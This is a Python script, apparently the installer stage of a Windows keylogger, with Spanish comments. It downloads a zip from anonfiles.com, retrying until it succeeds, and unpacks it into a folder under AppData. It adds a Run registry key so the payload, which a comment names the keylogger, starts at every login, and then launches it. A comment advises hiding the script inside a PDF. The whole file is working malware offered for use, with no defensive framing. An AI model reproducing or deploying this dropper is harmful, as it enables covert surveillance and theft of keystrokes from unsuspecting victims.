from getpass import getuser
from anonfile.anonfile import AnonFile
from os import getcwd, chdir, mkdir, makedirs, remove, rmdir, listdir
from os.path import exists
import zipfile
from win32api import RegCloseKey, RegOpenKeyEx, RegSetValueEx
from win32con import HKEY_CURRENT_USER, KEY_WRITE, REG_SZ
from subprocess import Popen
from sys import executable

''' i recommend use this script embedded in a pdf or similar, to use with key.py but not indispensable ''''
class Init:
    def __init__(self, user):
        self.path = 'C:\\Users\\{}\\AppData\\Local\\Microsoft\\W4tt_key'.format(user)     #  todo bien
        self.user_name = user
        self.anon_key = '11111111111'       #  API KEY of anonfiles
        self.url = 'https://anonfiles.com/LfH4C86bq9/test_zip'

    def verify_make(self):
        if exists(self.path) == False:
            mkdir(self.path)
            chdir(self.path)
            self.download_zip()
        else:
            exit()

    def download_zip(self):      #  Intenta Descarga el archivo zip de anonfiles tanto como sea necesario
        try:
            anon = AnonFile(self.anon_key)
            anon.download_file(self.url)
            l = listdir(self.path)
            if 'test.zip' not in  l:       #  nombre del archivo zip que deberia ser descargado
                self.download_zip()
        except :
                self.download_zip()
                '''
                try:
                    if 'test.zip' in  l:       #  nombre del archivo zip que deberia ser descargado
                        pass
                    else:
                        raise Exception
                except Exception:
                    self.download_zip()
                '''

    def des_del(self):      #  descomprime el archivo zip y luega lo borra dejando unicamente el archivo exe
        ruta_zip = self.path+"\\test.zip"       #  ruta del zip a descomprimir
        ruta_extraccion = self.path
        password = None
        archivo_zip = zipfile.ZipFile(ruta_zip, "r")
        try:
            archivo_zip.extractall(pwd=password, path=ruta_extraccion)
        except:
            pass
        archivo_zip.close()
        remove(ruta_zip)

    def add_register(self,appname, path):       #  añade al registro el keylogger, pero solo en el usuario actual
        """
        Sets the registry key to run at startup.

        """
        SUBKEY = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
        key = RegOpenKeyEx(HKEY_CURRENT_USER, SUBKEY, 0, KEY_WRITE)
        RegSetValueEx(key, appname, 0, REG_SZ, path)
        RegCloseKey(key)


    def execute(self):
        #Popen(self.path + '\\key2.py')
        Popen([executable, "key2.py"])



c = Init(getuser())
c.verify_make()
c.des_del()
c.add_register('test', c.path + '\\key2.py')
c.execute()
exit()
